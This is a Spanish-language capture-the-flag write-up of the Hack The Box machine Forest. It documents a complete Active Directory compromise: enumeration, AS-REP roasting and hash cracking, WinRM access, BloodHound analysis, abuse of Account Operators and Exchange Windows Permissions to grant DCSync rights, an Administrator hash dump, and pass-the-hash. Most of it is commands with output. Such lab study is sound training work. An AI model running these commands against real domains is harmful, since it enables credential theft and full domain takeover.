---
tags:
  - Cybersecurity
  - eCPPT
  - Labs
  - HTB
  - Easy
  - AD
  - AS-REPRoasting
  - Bloodhound
  - DCSync
  - Pass-The-Hash
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Escaneo de puertos|Escaneo de puertos]]
	- [[#Enumeración#Enumeración de Active Directory|Enumeración de Active Directory]]
		- [[#Enumeración de Active Directory#RPCClient|RPCClient]]
		- [[#Enumeración de Active Directory#Validación de usuarios|Validación de usuarios]]
- [[#Explotación|Explotación]]
	- [[#Explotación#AS-REP Roasting|AS-REP Roasting]]
		- [[#AS-REP Roasting#GetNPUsers|GetNPUsers]]
		- [[#AS-REP Roasting#Hashcat|Hashcat]]
- [[#Escalada de Privilegios|Escalada de Privilegios]]
	- [[#Escalada de Privilegios#LDAPDomainDump|LDAPDomainDump]]
	- [[#Escalada de Privilegios#Bloodhound|Bloodhound]]
	- [[#Escalada de Privilegios#DCSync|DCSync]]
	- [[#Escalada de Privilegios#Pass-The-Hash|Pass-The-Hash]]


---
# Forest

![](Screenshots/Pasted%20image%2020260422185024.png)

>Máquina retirada de Hack The Box llamada **[Forest](https://app.hackthebox.com/machines/Forest)**, que presenta un entorno de **Active Directory sobre Windows Server 2016**, actuando como **Domain Controller**.
>La explotación comienza con la **enumeración de servicios característicos de un Domain Controller** como LDAP, Kerberos y SMB, lo que permite identificar el dominio `htb.local` y obtener una lista de usuarios mediante RPC.
>Tras validar los usuarios, se detecta una cuenta vulnerable a **AS-REP Roasting (`svc-alfresco`)**, lo que permite obtener su hash Kerberos sin necesidad de autenticación y **crackearlo offline para recuperar credenciales válidas**.
>Con acceso inicial mediante **WinRM**, se realiza una enumeración más profunda del dominio utilizando herramientas como BloodHound, identificando que el usuario comprometido pertenece al grupo **Account Operators**, lo que permite la **creación y gestión de cuentas en el dominio**.
>Abusando de estos privilegios, se crea un nuevo usuario y se le asigna al grupo **Exchange Windows Permissions**, lo que posibilita **modificar las ACL del dominio y otorgarse permisos de DCSync**.
>Finalmente, se ejecuta un **ataque DCSync** para extraer los hashes del controlador de dominio, incluyendo el del usuario **Administrator**, y se utiliza **Pass-The-Hash** para obtener acceso completo al sistema.

---
## Enumeración
### Identificación del sistema

```PowerShell
ping -c 1 10.129.95.210
PING 10.129.95.210 (10.129.95.210) 56(84) bytes of data.
64 bytes from 10.129.95.210: icmp_seq=1 ttl=127 time=44.2 ms

--- 10.129.95.210 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 44.207/44.207/44.207/0.000 ms
```

El `TTL=127` indica que probablemente estamos ante un sistema Windows.
### Escaneo de puertos

```PowerShell
nmap -p- --open -sS --min-rate 5000 -sS -vvv -n -Pn 10.129.95.210 -oG allPorts
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49671/tcp open  unknown          syn-ack ttl 127
49680/tcp open  unknown          syn-ack ttl 127
49681/tcp open  unknown          syn-ack ttl 127
49684/tcp open  unknown          syn-ack ttl 127
49697/tcp open  unknown          syn-ack ttl 127
```

```PowerShell
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49680,49681,49684,49697 -sCV 10.129.95.210 -oN targeted
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-04-22 06:35:29Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49680/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49681/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49697/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2026-04-21T23:36:21-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: 2h26m49s, deviation: 4h02m31s, median: 6m48s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-04-22T06:36:22
|_  start_date: 2026-04-22T06:29:57
```

LDAP + Kerberos + SMB → _Domain Controler_

- Dominio: `htb.local`
- Host: `FOREST`
- OS: `Windows Server 2016 Standard 14393`

Se añade al archivo `/etc/hosts` el dominio: `10.129.95.210 htb.local`.
### Enumeración de Active Directory
#### RPCClient

```PowerShell
rpcclient -U "" -N 10.129.95.210
rpcclient $> querydominfo 
Domain:         HTB
Server:
Comment:
Total Users:    105
Total Groups:   0
Total Aliases:  0
Sequence No:    1
Force Logoff:   18446744073709551615
Domain Server State:    0x1
Server Role:    ROLE_DOMAIN_PDC
Unknown 3:      0x1

rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]

rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Organization Management] rid:[0x450]
group:[Recipient Management] rid:[0x451]
group:[View-Only Organization Management] rid:[0x452]
group:[Public Folder Management] rid:[0x453]
group:[UM Management] rid:[0x454]
group:[Help Desk] rid:[0x455]
group:[Records Management] rid:[0x456]
group:[Discovery Management] rid:[0x457]
group:[Server Management] rid:[0x458]
group:[Delegated Setup] rid:[0x459]
group:[Hygiene Management] rid:[0x45a]
group:[Compliance Management] rid:[0x45b]
group:[Security Reader] rid:[0x45c]
group:[Security Administrator] rid:[0x45d]
group:[Exchange Servers] rid:[0x45e]
group:[Exchange Trusted Subsystem] rid:[0x45f]
group:[Managed Availability Servers] rid:[0x460]
group:[Exchange Windows Permissions] rid:[0x461]
group:[ExchangeLegacyInterop] rid:[0x462]
group:[$D31000-NSEL5BRJ63V7] rid:[0x46d]
group:[Service Accounts] rid:[0x47c]
group:[Privileged IT Accounts] rid:[0x47d]
group:[test] rid:[0x13ed]

rpcclient $> querydispinfo
index: 0x2137 RID: 0x463 acb: 0x00020015 Account: $331000-VK4ADACQNUCA  Name: (null)    Desc: (null)
index: 0xfbc RID: 0x1f4 acb: 0x00000010 Account: Administrator  Name: Administrator     Desc: Built-in account for administering the computer/domain
index: 0x2369 RID: 0x47e acb: 0x00000210 Account: andy  Name: Andy Hislip       Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0x2352 RID: 0x478 acb: 0x00000210 Account: HealthMailbox0659cc1  Name: HealthMailbox-EXCH01-010  Desc: (null)
index: 0x234b RID: 0x471 acb: 0x00000210 Account: HealthMailbox670628e  Name: HealthMailbox-EXCH01-003  Desc: (null)
index: 0x234d RID: 0x473 acb: 0x00000210 Account: HealthMailbox6ded678  Name: HealthMailbox-EXCH01-005  Desc: (null)
index: 0x2351 RID: 0x477 acb: 0x00000210 Account: HealthMailbox7108a4e  Name: HealthMailbox-EXCH01-009  Desc: (null)
index: 0x234e RID: 0x474 acb: 0x00000210 Account: HealthMailbox83d6781  Name: HealthMailbox-EXCH01-006  Desc: (null)
index: 0x234c RID: 0x472 acb: 0x00000210 Account: HealthMailbox968e74d  Name: HealthMailbox-EXCH01-004  Desc: (null)
index: 0x2350 RID: 0x476 acb: 0x00000210 Account: HealthMailboxb01ac64  Name: HealthMailbox-EXCH01-008  Desc: (null)
index: 0x234a RID: 0x470 acb: 0x00000210 Account: HealthMailboxc0a90c9  Name: HealthMailbox-EXCH01-002  Desc: (null)
index: 0x2348 RID: 0x46e acb: 0x00000210 Account: HealthMailboxc3d7722  Name: HealthMailbox-EXCH01-Mailbox-Database-1118319013  Desc: (null)
index: 0x2349 RID: 0x46f acb: 0x00000210 Account: HealthMailboxfc9daad  Name: HealthMailbox-EXCH01-001  Desc: (null)
index: 0x234f RID: 0x475 acb: 0x00000210 Account: HealthMailboxfd87238  Name: HealthMailbox-EXCH01-007  Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0x2360 RID: 0x47a acb: 0x00000210 Account: lucinda       Name: Lucinda Berger    Desc: (null)
index: 0x236a RID: 0x47f acb: 0x00000210 Account: mark  Name: Mark Brandt       Desc: (null)
index: 0x236b RID: 0x480 acb: 0x00000210 Account: santi Name: Santi Rodriguez   Desc: (null)
index: 0x235c RID: 0x479 acb: 0x00000210 Account: sebastien     Name: Sebastien Caron   Desc: (null)
index: 0x215a RID: 0x468 acb: 0x00020011 Account: SM_1b41c9286325456bb  Name: Microsoft Exchange Migration      Desc: (null)
index: 0x2161 RID: 0x46c acb: 0x00020011 Account: SM_1ffab36a2f5f479cb  Name: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}       Desc: (null)
index: 0x2156 RID: 0x464 acb: 0x00020011 Account: SM_2c8eef0a09b545acb  Name: Microsoft Exchange Approval Assistant     Desc: (null)
index: 0x2159 RID: 0x467 acb: 0x00020011 Account: SM_681f53d4942840e18  Name: Discovery Search Mailbox  Desc: (null)
index: 0x2158 RID: 0x466 acb: 0x00020011 Account: SM_75a538d3025e4db9a  Name: Microsoft Exchange        Desc: (null)
index: 0x215c RID: 0x46a acb: 0x00020011 Account: SM_7c96b981967141ebb  Name: E4E Encryption Store - Active     Desc: (null)
index: 0x215b RID: 0x469 acb: 0x00020011 Account: SM_9b69f1b9d2cc45549  Name: Microsoft Exchange Federation Mailbox     Desc: (null)
index: 0x215d RID: 0x46b acb: 0x00020011 Account: SM_c75ee099d0a64c91b  Name: Microsoft Exchange        Desc: (null)
index: 0x2157 RID: 0x465 acb: 0x00020011 Account: SM_ca8c2ed5bdab4dc9b  Name: Microsoft Exchange        Desc: (null)
index: 0x2365 RID: 0x47b acb: 0x00010210 Account: svc-alfresco  Name: svc-alfresco      Desc: (null)
```

Se enumeran usuarios, grupos y descripciones de usuarios del dominio.

Se procesan los resultados para obtener listas limpias:

```PowerShell
cat users.txt | awk -F'[][]' '{print $2}' | sponge users.txt
cat groups.txt | awk -F'[][]' '{print $2}' | sponge groups.txt
```
#### Kerbrute

Se validan los usuarios del dominio.

```PowerShell
kerbrute userenum --dc 10.129.95.210 -d htb.local users.txt

[+] VALID USERNAME:       Administrator@htb.local
[+] VALID USERNAME:       HealthMailbox968e74d@htb.local
[+] VALID USERNAME:       HealthMailbox670628e@htb.local
[+] VALID USERNAME:       HealthMailboxc0a90c9@htb.local
[+] VALID USERNAME:       HealthMailboxfc9daad@htb.local
[+] VALID USERNAME:       HealthMailboxc3d7722@htb.local
[+] VALID USERNAME:       HealthMailbox6ded678@htb.local
[+] VALID USERNAME:       HealthMailbox83d6781@htb.local
[+] VALID USERNAME:       sebastien@htb.local
[+] VALID USERNAME:       HealthMailboxb01ac64@htb.local
[+] VALID USERNAME:       HealthMailboxfd87238@htb.local
[+] VALID USERNAME:       HealthMailbox7108a4e@htb.local
[+] VALID USERNAME:       HealthMailbox0659cc1@htb.local
[+] VALID USERNAME:       andy@htb.local
[+] VALID USERNAME:       mark@htb.local
[+] VALID USERNAME:       lucinda@htb.local
[+] VALID USERNAME:       svc-alfresco@htb.local
[+] VALID USERNAME:       santi@htb.local
```

---
## Explotación
### AS-REP Roasting

El ataque **AS-REP Roasting** permite obtener hashes Kerberos de usuarios que tienen deshabilitada la preautenticación.

Esto permite solicitar un **ticket AS-REP sin conocer la contraseña**, el cual puede ser crackeado offline.
#### GetNPUsers

```PowerShell
impacket-GetNPUsers htb.local/ -usersfile users.txt -no-pass
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User HealthMailboxc3d7722 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfc9daad doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxc0a90c9 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox670628e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox968e74d doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox6ded678 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox83d6781 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfd87238 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxb01ac64 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox7108a4e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox0659cc1 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:e4c80fe281e21aefbe87fd090c2bbda1$88a89682000f01d6b8aa6535318fed26aa99cce453638f18ce0f12f05761753df637df2712466f125721ad3ec021c3195344c9cbd18aabe62a0f95234075f60c67f525cced8beacdb65509fb3ce087607f3fbc8275e17ceb4f08bfd4be0a85c63237b56a71b481de2d35c0e81e215d2b45785f652065e563f2dc9355722dee5500c473d6643ab64204fe0b8de20e11396f88a48dfb80a68133e1e11ae3e363f75aa9913db3f6e81609bc1bf3aaa13c8efc344f4ec85e88fcc3ad26bea7e07b8bdb75dd2bd8b49b305648966d234773bb6c18f3d841f9673c444fded900d6f880ec92edf2d707
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Se obtiene un hash del usuario `svc-alfresco`.
#### Crackeo con Hashcat

```PowerShell
hashcat -m 18200 hash_svc-alfresco /usr/share/wordlists/rockyou.txt
$krb5asrep$23$svc-alfresco@HTB.LOCAL:e4c80fe281e21aefbe87fd090c2bbda1$88a89682000f01d6b8aa6535318fed26aa99cce453638f18ce0f12f05761753df637df2712466f125721ad3ec021c3195344c9cbd18aabe62a0f95234075f60c67f525cced8beacdb65509fb3ce087607f3fbc8275e17ceb4f08bfd4be0a85c63237b56a71b481de2d35c0e81e215d2b45785f652065e563f2dc9355722dee5500c473d6643ab64204fe0b8de20e11396f88a48dfb80a68133e1e11ae3e363f75aa9913db3f6e81609bc1bf3aaa13c8efc344f4ec85e88fcc3ad26bea7e07b8bdb75dd2bd8b49b305648966d234773bb6c18f3d841f9673c444fded900d6f880ec92edf2d707:s3rvice
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$svc-alfresco@HTB.LOCAL:e4c80fe281e21a...f2d707
Time.Started.....: Wed Apr 22 09:33:51 2026 (2 secs)
Time.Estimated...: Wed Apr 22 09:33:53 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1892.1 kH/s (1.55ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4087808/14344385 (28.50%)
Rejected.........: 0/4087808 (0.00%)
Restore.Point....: 4083712/14344385 (28.47%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: s523480 -> s2704081
Hardware.Mon.#01.: Util: 66%
```

Se obtiene las credenciales: `svc-alfresco@HTB.LOCAL:s3rvice`.

Se comprueba las credenciales en `SMB`.

```PowerShell
crackmapexec smb 10.129.95.210 -u 'svc-alfresco' -p 's3rvice'
SMB         10.129.95.210   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.129.95.210   445    FOREST           [+] htb.local\svc-alfresco:s3rvice
```

Se comprueba las credenciales en `WinRM`.

```PowerShell
crackmapexec winrm 10.129.95.210 -u 'svc-alfresco' -p 's3rvice'
SMB         10.129.95.210   5985   FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)
HTTP        10.129.95.210   5985   FOREST           [*] http://10.129.95.210:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.95.210   5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
```
#### Acceso por WinRM
Nos conectamos a `WinRM` mediante `evil-winrm` para obtener una consola interactiva.

```PowerShell
evil-winrm -i 10.129.95.210 -u svc-alfresco -p s3rvice
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents>
```

La flag de `usuario` se encuentra en: `C:\Users\svc-alfresco\Desktop`.

---
## Escalada de Privilegios
### LDAPDomainDump

```
mkdir ldapdomaindump
cd ldapdomaindump
ldapdomaindump -u 'htb.local\svc-alfresco' -p 's3rvice' 10.129.95.210
ls
domain_computers_by_os.html  domain_computers.html  domain_groups.grep  domain_groups.json  domain_policy.html  domain_trusts.grep  domain_trusts.json          domain_users.grep  domain_users.json
domain_computers.grep        domain_computers.json  domain_groups.html  domain_policy.grep  domain_policy.json  domain_trusts.html  domain_users_by_group.html  domain_users.html

python3 -m http.server 80
```

De esta manera puedes visualizar mejor de manera descriptiva los permisos, grupos, etc.

```HTML
http://localhost/domain_users_by_group.html#cn_Service_Accounts
```

De esta manera, se puede hacer la enumeración de forma manual.
### Bloodhound

Instalar [Bloodhound](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart).

Se descarga y se pasa a la máquina victima [SharpHound.exe](https://github.com/SpecterOps/BloodHound-Legacy/raw/refs/heads/master/Collectors/SharpHound.exe).

Máquina atacante:

```
wget https://github.com/SpecterOps/BloodHound-Legacy/raw/refs/heads/master/Collectors/SharpHound.exe
```

Máquina victima:

```PowerShell
mkdir bh
cd bh
upload SharpHound.exe
.\SharpHound.exe -c All
dir
    Directory: C:\Users\svc-alfresco\Desktop\bh


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/22/2026   8:34 AM          18877 20260422083457_BloodHound.zip
-a----        4/22/2026   8:34 AM          19605 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
-a----        4/22/2026   8:33 AM        1046528 SharpHound.exe

download 20260422083457_BloodHound.zip
```

Ya tenemos en la máquina atacante el archivo `data.zip` y se sube a `Bloodhound`.

![](Screenshots/Pasted%20image%2020260422175029.png)

En BloodHound se puede visualizar el camino de ataque (Attack Path), donde se observa cómo el usuario `svc-alfresco` puede escalar privilegios dentro del dominio.  
  
Este tipo de herramientas no solo enumeran información, sino que permiten identificar relaciones críticas entre usuarios, grupos y permisos, facilitando la detección de rutas de compromiso completas.

El grupo **Account Operators** es especialmente sensible, ya que permite gestionar cuentas del dominio (excepto las más privilegiadas).  
  
Esto incluye la capacidad de crear nuevos usuarios y modificar membresías de grupos, lo que puede ser abusado para introducir cuentas controladas por el atacante en grupos con mayores privilegios.

Se crea un usuario llamado `m4num0re`.

```PowerShell
net user m4num0re m4num0re /add /domain
The command completed successfully.

net user m4num0re
User name                    m4num0re
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            4/22/2026 8:59:41 AM
Password expires             Never
Password changeable          4/23/2026 8:59:41 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users
The command completed successfully.
```

Se asigna al nuevo usuario creado el grupo `EXCHANGE WINDOWS PERMISSIONS`.

```PowerShell
net group
Group Accounts for \\

-------------------------------------------------------------------------------
*$D31000-NSEL5BRJ63V7
*Cloneable Domain Controllers
*Compliance Management
*Delegated Setup
*Discovery Management
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*Exchange Servers
*Exchange Trusted Subsystem
*Exchange Windows Permissions
*ExchangeLegacyInterop
*Group Policy Creator Owners
*Help Desk
*Hygiene Management
*Key Admins
*Managed Availability Servers
*Organization Management
*Privileged IT Accounts
*Protected Users
*Public Folder Management
*Read-only Domain Controllers
*Recipient Management
*Records Management
*Schema Admins
*Security Administrator
*Security Reader
*Server Management
*Service Accounts
*test
*UM Management
*View-Only Organization Management
The command completed with one or more errors.

net group "Exchange Windows Permissions" m4num0re /add
The command completed successfully.

net user m4num0re
User name                    m4num0re
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            4/22/2026 8:59:41 AM
Password expires             Never
Password changeable          4/23/2026 8:59:41 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Exchange Windows Perm*Domain Users
The command completed successfully.
```

![](Screenshots/Pasted%20image%2020260422180903.png)

El grupo `Exchange Windows Permissions` tiene permisos para modificar ACLs en el dominio, lo que representa una configuración peligrosa.

Este tipo de permisos permite a un atacante modificar los derechos de seguridad sobre objetos críticos del dominio, incluyendo el propio dominio (`DC=htb,DC=local`).

Como resultado, es posible otorgarse privilegios de **DCSync**, equivalentes a los de un controlador de dominio, comprometiendo completamente el entorno.

Para abusar de estos permisos, se utiliza [PowerView](https://github.com/PowerShellMafia/PowerSploit/raw/refs/heads/master/Recon/PowerView.ps1), una herramienta que permite interactuar con Active Directory y modificar ACLs de forma programática.  
  
En este caso, se añade el derecho de **DCSync** al usuario controlado `m4num0re`), lo que le permitirá replicar información sensible del dominio.

```PowerShell
$SecPassword = ConvertTo-SecureString 'm4num0re' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\m4num0re', $SecPassword)
upload PowerView.ps1
dir
    Directory: C:\Users\svc-alfresco\Desktop\bh

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/22/2026   8:34 AM          18877 20260422083457_BloodHound.zip
-a----        4/22/2026   8:34 AM          19605 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
-a----        4/22/2026   9:10 AM         770279 PowerView.ps1
-a----        4/22/2026   8:33 AM        1046528 SharpHound.exe

Import-Module .\PowerView.ps1
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity m4num0re -Rights DCSync
```

El usuario `m4num0re` ahora tiene permisos de replicación sobre el dominio.
### DCSync

El ataque **DCSync** permite simular un controlador de dominio y replicar información sensible, incluyendo los hashes de todos los usuarios.

Esto compromete completamente la seguridad del dominio, ya que permite obtener credenciales de cuentas privilegiadas como **Administrator**.

```PowerShell
impacket-secretsdump htb.local/m4num0re@10.129.95.210
Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
...
```
### Pass-The-Hash

**Pass-The-Hash** permite autenticarse utilizando directamente el **hash NTLM** sin necesidad de conocer la contraseña en texto plano.

Esto es posible porque algunos protocolos de Windows aceptan hashes como método de autenticación.

```PowerShell
crackmapexec winrm 10.129.95.210 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'
SMB         10.129.95.210   5985   FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)
HTTP        10.129.95.210   5985   FOREST           [*] http://10.129.95.210:5985/wsman
